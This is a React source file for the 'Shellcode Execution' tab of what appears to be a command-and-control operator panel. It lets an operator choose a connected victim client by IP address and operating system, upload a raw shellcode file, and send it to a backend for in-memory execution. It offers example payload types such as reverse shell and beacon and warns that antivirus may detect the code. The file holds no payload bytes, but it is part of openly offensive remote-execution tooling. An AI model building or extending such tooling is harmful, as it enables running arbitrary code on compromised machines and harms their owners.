import React from 'react';
import { apiService } from '../services/api.js';

function ShellcodeTab({ selectedClient, clients, onClientSelect, setStatus }) {
    // Stores the file object chosen by the user (.bin, .raw, etc.)
    const [selectedShellcodeFile, setSelectedShellcodeFile] =
        React.useState(null);

    // ======================================
    //  Send shellcode file to backend
    // ======================================
    const sendShellcode = async () => {
        // Ensure both client and file are chosen
        if (!selectedClient || !selectedShellcodeFile) {
            setStatus('❌ Please select a client and shellcode file');
            return;
        }

        try {
            // Send shellcode file to backend
            const data = await apiService.sendShellcode(
                selectedClient,
                selectedShellcodeFile,
            );

            // Update UI status
            setStatus(data.status);

            // Clear internal state + reset file input UI
            setSelectedShellcodeFile(null);
            document.getElementById('shellcode-input').value = '';
        } catch (error) {
            setStatus('Error: ' + error.message);
        }
    };

    // ======================================
    //  When user selects a file from disk
    // ======================================
    const handleShellcodeFileSelect = (event) => {
        setSelectedShellcodeFile(event.target.files[0]);
    };

    // ======================================
    //  Fake/example shellcode options
    //  (Purely informational — does not load files)
    // ======================================
    const loadExampleShellcode = (exampleName) => {
        setStatus(
            `⚠️ ${exampleName} - Remember to upload actual shellcode file`,
        );
    };

    // List of example types displayed as buttons
    const examples = [
        { label: 'MessageBox', name: 'MessageBox' },
        { label: 'Calculator', name: 'Calc' },
        { label: 'Reverse Shell', name: 'Reverse Shell' },
        { label: 'Beacon', name: 'Beacon' },
    ];

    // ======================================
    //  Render UI
    // ======================================
    return (
        <div className="danger-zone">
            <h3>⚡ Shellcode Execution</h3>

            {/* High-risk warning block */}
            <div className="shellcode-warning">
                <strong>⚠️ WARNING: DANGEROUS OPERATION</strong>
                <br />
                • Shellcode executes directly in memory
                <br />
                • Can crash the target system
                <br />
                • May trigger antivirus detection
                <br />• Use only with proper authorization
            </div>

            {/* Client selector dropdown */}
            <select
                value={selectedClient}
                onChange={(e) => onClientSelect(e.target.value)}
            >
                <option value="">Select Client</option>
                {clients.map((client) => (
                    <option key={client.IPAddress} value={client.IPAddress}>
                        {client.ID} ({client.IPAddress}) -{' '}
                        {client.SystemInfo?.OS}
                    </option>
                ))}
            </select>

            {/* File upload input (.bin, .raw, etc.) */}
            <input
                id="shellcode-input"
                type="file"
                onChange={handleShellcodeFileSelect}
                accept=".bin,.raw,.sc,.txt"
            />

            {/* Execute shellcode button */}
            <button
                onClick={sendShellcode}
                disabled={!selectedClient || !selectedShellcodeFile}
                style={{ background: '#dc3545' }} // Red = danger action
            >
                🚀 Execute Shellcode
            </button>

            {/* Show selected file summary */}
            {selectedShellcodeFile && (
                <div style={{ marginTop: '10px' }}>
                    <strong>Selected Shellcode:</strong>{' '}
                    {selectedShellcodeFile.name}(
                    {(selectedShellcodeFile.size / 1024).toFixed(2)} KB)
                </div>
            )}

            {/* Example shellcode concept buttons */}
            <div style={{ marginTop: '15px' }}>
                <h4>💡 Example Shellcode Types:</h4>
                {examples.map((example, index) => (
                    <button
                        key={index}
                        onClick={() => loadExampleShellcode(example.name)}
                    >
                        {example.label}
                    </button>
                ))}
            </div>

            {/* Accepted formats reminder */}
            <p style={{ fontSize: '0.8em', color: '#666', marginTop: '10px' }}>
                📋 Upload raw binary shellcode files (.bin, .raw) or text format
            </p>
        </div>
    );
}

export default ShellcodeTab;
